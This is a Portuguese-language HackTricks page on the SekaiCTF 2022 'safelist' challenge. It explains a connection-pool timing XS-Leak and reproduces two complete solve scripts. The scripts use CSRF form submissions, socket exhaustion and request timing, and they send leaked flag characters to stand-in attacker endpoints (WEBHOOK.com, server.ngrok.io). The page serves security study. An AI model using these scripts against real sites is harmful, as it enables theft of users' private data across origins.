# Exemplo de Pool de Conex√£o

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

No desafio [**Sekaictf2022 - safelist**](https://github.com/project-sekai-ctf/sekaictf-2022/tree/main/web/safelist/solution), [**@Strellic\_**](https://twitter.com/Strellic\_) d√° um exemplo de como usar uma **varia√ß√£o** da t√©cnica de **Pool de Conex√£o** para realizar um **XS-Leak**.

Neste desafio, o objetivo √© exfiltrar uma bandeira que aparecer√° na sess√£o web dos bots dentro de um post. Estes s√£o os ativos que o atacante possui:

* O **bot** ir√° **visitar** uma **URL** fornecida pelo atacante
* O atacante pode **injetar HTML** na p√°gina (mas sem JS, o dompurify √© usado) abusando de um **CSRF** fazendo com que o **bot crie um post** com esse HTML.
* O atacante pode abusar de um CSRF para fazer com que o **bot delete** o **primeiro post** dentro da web.
* Como os **posts** s√£o ordenados **alfabeticamente**, quando o **primeiro post √© deletado**, se o **conte√∫do HTML do atacante for carregado** significa que ele estava **alfabeticamente antes da bandeira**.

Portanto, para roubar a bandeira, a solu√ß√£o proposta por @Strellyc\_ √©, **para cada caractere a testar**, fazer com que o bot:

* Crie um **novo post** que **come√ßa** com a parte conhecida da **bandeira** e v√°rios **carregamentos de img**.
* **Delete** o **post** na posi√ß√£o **0**.
* Bloqueie 255 sockets.
* Carregue a p√°gina com os posts.
* Realize 5 solicita√ß√µes aleat√≥rias para um site (example.com neste caso) e me√ßa o tempo que isso leva.

{% hint style="warning" %}
Se o **post deletado** foi a **bandeira**, isso significa que todas as **imagens injetadas** no HTML v√£o **competir** com as **5 solicita√ß√µes aleat√≥rias** por aquele socket **desbloqueado**. O que significa que o tempo medido ser√° maior do que o outro cen√°rio.

Se o **post deletado** foi o **HTML**, as **5 solicita√ß√µes aleat√≥rias** ser√£o **mais r√°pidas** porque n√£o precisam competir por aquele socket com o HTML injetado.
{% endhint %}

### Explora√ß√£o 1

Este √© o c√≥digo de explora√ß√£o, retirado de [https://github.com/project-sekai-ctf/sekaictf-2022/blob/main/web/safelist/solution/solve.html](https://github.com/project-sekai-ctf/sekaictf-2022/blob/main/web/safelist/solution/solve.html):
```html
<!-- Form to inject HTML code in the bots page -->
<form method="POST" action="https://safelist.ctf.sekai.team/create" id="create" target="_blank">
    <input type="text" name="text" />
    <input type="submit" />
</form>

<!-- Form to delete the first entry -->
<form method="POST" action="https://safelist.ctf.sekai.team/remove" id="remove" target="_blank">
    <input type="text" name="index" value="0" />
    <input type="submit" />
</form>

<script>
    // Attacker listening
    const WEBHOOK = "https://WEBHOOK.com/";
    // Send data to attacker
    const log = (id, data) => {
        let payload = JSON.stringify({ known, alphabet, data });
        console.log(id, payload);
        navigator.sendBeacon(WEBHOOK + "?" + id, payload); 
    }
    
    // Similar to JQuery
    const $ = document.querySelector.bind(document);
    
    // Known part of the flag
    const known = "SEKAI{";
    let alphabet = "_abcdefghijklmnopqrstuvwxyz}";
    
    // Reduce the alphabet using a hash (#) in the URL
    if (location.hash) {
        alphabet = alphabet.slice(alphabet.indexOf(location.hash.slice(1)));
    }
    
    // Funtion to leak chars
    const leak = async (c) => {
        // Prepare post with known flag and the new char
        let payload = `${known + c}`;
        // Inject as many <img as possible
        // you need to respect the CSP and create URLs that are different
        for(let i = 0; payload.length < 2048; i++) {
            payload += `<img src=js/purify.js?${i.toString(36)}>`;
        }
        
        // Inject HTML
        $("#create input[type=text]").value = payload;
        $("#create").submit();
        await new Promise(r => setTimeout(r, 1000));
        
        // Remove post with index 0
        $("#remove").submit();
        await new Promise(r => setTimeout(r, 500));
        
        let deltas = [];
        
        // Try each char 3 times
        for (let i = 0; i < 3; i++) {
            const SOCKET_LIMIT = 255;
            // you will need a custom server that works like num.sleepserver.com/sleep/delay
            // needed to freeze the blocked sockets, and they have to all be on different origins
            // Check https://www.npmjs.com/package/sleep-server using subdomains DNS wildcard
            const SLEEP_SERVER = i => `http://${i}.sleepserver.com/sleep/60`; 

            const block = async (i, controller) => {
                try {
                    return fetch(SLEEP_SERVER(i), { mode: "no-cors", signal: controller.signal });
                }
                catch(err) {}
            };

            // block SOCKET_LIMIT sockets
            const controller = new AbortController();
            for (let i = 0; i < SOCKET_LIMIT; i++) {
                block(i, controller);
            }
            
            // Make the bot access the page with the posts
            window.open("https://safelist.ctf.sekai.team/?" + Math.random().toString(36).slice(2), "pwn");
            await new Promise(r => setTimeout(r, 500));
            
            // start meassuring time to perform 5 requests
            let start = performance.now();
            await Promise.all([
                fetch("https://example.com", { mode: "no-cors" }),
                fetch("https://example.com", { mode: "no-cors" }),
                fetch("https://example.com", { mode: "no-cors" }),
                fetch("https://example.com", { mode: "no-cors" }),
                fetch("https://example.com", { mode: "no-cors" })
            ]);
            let delta = performance.now() - start;
            document.title = delta;
            controller.abort();

            log("test_" + c + "_" + i, delta);
            
            // Save time needed
            deltas.push(delta);
        }
        return deltas;
    };
    
    // Check each char
    const pwn = async () => {
        // Try to leak each character
        for(let i = 0; i < alphabet.length; i++) {
            //Check the indicated char
            let deltas = await leak(alphabet[i]);
            
            // Calculate mean time from requests to example.com
            let avg = deltas.reduce((a,v) => a+v, 0) / deltas.length;
            
            // If greater than 250, the HTML code was injected (flag in index 0)
            if (avg > 250) {
                log("tests_pos_" + alphabet[i], deltas)
            }
            // Flag in the page
            else {
                log("tests_neg_" + alphabet[i], deltas)
            }
        }
    };

    window.onload = async () => {
        pwn();
    };
</script>
```
### Explora√ß√£o 2

Mesma t√°tica, mas c√≥digo diferente de [https://blog.huli.tw/2022/10/05/en/sekaictf2022-safelist-xsleak/](https://blog.huli.tw/2022/10/05/en/sekaictf2022-safelist-xsleak/)
```html
<!DOCTYPE html>
<html>
<!--
  The basic idea is to create a post with a lot of images which send request to "/" to block server-side nodejs main thread.
  If images are loading, the request to "/" is slower, otherwise faster.
  By using a well-crafted height, we can let note with "A" load image but note with "Z" not load.
  We can use fetch to measure the request time.
-->
<body>
  <button onclick="run()">start</button>
  <form id=f action="http://localhost:1234/create" method="POST" target="_blank">
    <input id=inp name="text" value="">
  </form>

  <form id=f2 action="http://localhost:1234/remove" method="POST" target="_blank">
    <input id=inp2 name="index" value="">
  </form>
  <script>
    let flag = 'SEKAI{'
    const TARGET = 'https://safelist.ctf.sekai.team'
    f.action = TARGET + '/create'
    f2.action = TARGET + '/remove'

    const sleep = ms => new Promise(r => setTimeout(r, ms))
    const send = data => fetch('http://server.ngrok.io?d='+data)
    const charset = 'abcdefghijklmnopqrstuvwxyz'.split('')

    // start exploit
    let count = 0
    setTimeout(async () => {
      let L = 0
      let R = charset.length - 1
      while( (R-L)>3 ) {
        let M = Math.floor((L + R) / 2)
        let c = charset[M]
        send('try_' + flag + c)
        const found = await testChar(flag + c)
        if (found) {
          L = M
        } else {
          R = M - 1
        }
      }

      // fallback to linear since I am not familiar with binary search lol
      for(let i=R; i>=L; i--) {
        let c = charset[i]
        send('try_' + flag + c)
        const found = await testChar(flag + c)
        if (found) {
          send('found: '+ flag+c)
          flag += c
          break
        }
      }
      
    }, 0)

    async function testChar(str) {
      return new Promise(resolve => {
          /*
            For 3350, you need to test it on your local to get this number.
            The basic idea is, if your post starts with "Z", the image should not be loaded because it's under lazy loading threshold
            If starts with "A", the image should be loaded because it's in the threshold.
          */
          inp.value = str + '<br><canvas height="3350px"></canvas><br>'+Array.from({length:20}).map((_,i)=>`<img loading=lazy src=/?${i}>`).join('')
          f.submit()

          setTimeout(() => {
            run(str, resolve)
          }, 500)
      })
    }

    async function run(str, resolve) {
    // if the request is not enough, we can send more by opening more window
      for(let i=1; i<=5;i++) {
        window.open(TARGET)
      }
      
      let t = 0
      const round = 30
      setTimeout(async () => {
        for(let i=0; i<round; i++) {
          let s = performance.now()
          await fetch(TARGET + '/?test', {
            mode: 'no-cors'
          }).catch(err=>1)
          let end = performance.now()
          t += end - s
          console.log(end - s)
        }
        const avg = t/round
        send(str + "," + t + "," + "avg:" + avg)

        /*
          I get this threshold(1000ms) by trying multiple times on remote admin bot
          for example, A takes 1500ms, Z takes 700ms, so I choose 1000 ms as a threshold
        */
        const isFound = (t >= 1000)
        if (isFound) {
          inp2.value = "0"
        } else {
          inp2.value = "1"
        }

        // remember to delete the post to not break our leak oracle
        f2.submit()
        setTimeout(() => {
          resolve(isFound)
        }, 200)
      }, 200)
    }
    
  </script>

</body>

</html>
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
